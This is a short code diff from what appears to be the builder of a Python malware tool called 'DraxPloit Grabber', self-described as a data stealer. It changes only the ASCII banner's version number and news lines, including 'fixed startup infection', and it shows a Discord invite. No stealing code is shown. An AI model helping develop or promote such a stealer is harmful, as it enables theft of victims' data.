@@ -120,7 +120,7 @@ class Builder:
                             .cdk0OO0OOOOOOOOOOOOOOOOkdc.                            
                           .:dk0O00O0OOOOOOOOOOOOOOOOO0Odc.                          
                         .:dk0O00OO0OOOOOOOOOOOOOOOOOO00OOdc.                     
-                      .:dOOOOOOOOOOOOOOO0OO00OOOOOOOO00OO0Odc.          DraxPloit Grabber v1.4         
+                      .:dOOOOOOOOOOOOOOO0OO00OOOOOOOO00OO0Odc.          DraxPloit Grabber v1.42         
                     .:dO00OOOOOOOOOOOO0O0OOOOOOOOOOOO00O0O00Odc.        Data Stealer written in Python           
                     ,k0O0OO00OO0OOO000000OOo:;,,,,ck00000OOOO0k,                    
                     ,k0OOOO000000OOOOO00Oo;.       'cx000OOO00k,          
@@ -134,8 +134,8 @@ class Builder:
                   ;kO0OOOOOOOOOOkdc. ckl''''''ckOOOO00O0x. .,ok,        discord.gg/sEXECdC3Et     
                   'lxOOO0OO0O0Odc.   cOOOOOOkOOOOOO0OOkdc. ckdl.                    
                     'oxOO00O00d' ..  cOOO00O0O00OOOOkdl,. .lk,          News:         
-                      'oxO0OO0x,'ld;.lO0OO0OOO00O0kxl,,oo..lk,           - this banner was added         
-                        ,x0OO0OkkOOkkOOO0OOOOOOO00o..okOd..lk'           - here will be more in the future         
+                      'oxO0OO0x,'ld;.lO0OO0OOO00O0kxl,,oo..lk,           - fixed startup infection         
+                        ,x0OO0OkkOOkkOOO0OOOOOOO00o..okOd..lk'           - this banner was added         
                         .okO000OOOO0OO0OOOO0OO00Oxc..d00d..lk,                      
                          .'okxxxxxxxxxxxxxxxxxxxl,. .dOko..lk,                      
                            .....................;o:..od;. .lx,                      
